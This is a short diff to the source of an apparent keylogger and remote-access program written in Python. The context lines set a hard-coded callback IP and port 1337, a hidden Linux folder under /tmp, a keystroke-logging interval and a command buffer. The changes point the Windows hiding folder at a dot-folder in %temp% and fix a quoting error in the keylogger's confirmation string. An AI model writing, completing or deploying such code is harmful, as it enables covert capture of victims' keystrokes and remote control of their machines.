@@ -27,7 +27,7 @@ SYSTEM = system() # The operating this program is being ran on.
 IP = '192.168.31.134' # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
 LIN_DIR = '/tmp/.folder' # Hidden Linux folder to create for our keylogger.
-WIN_DIR = r'%temp%'
+WIN_DIR = r'%temp%\.folder' # Hideen Windows folder to create for our keylogger.
 SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
@@ -180,7 +180,7 @@ def keylogger():
 			capturer.join() # Collent keystrokes until program exit.
 		except OSError: # Ignore os error.
 			pass
-	return r'Keylogger initiated...'' # Return confirmation string.
+	return r'Keylogger initiated...' # Return confirmation string.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
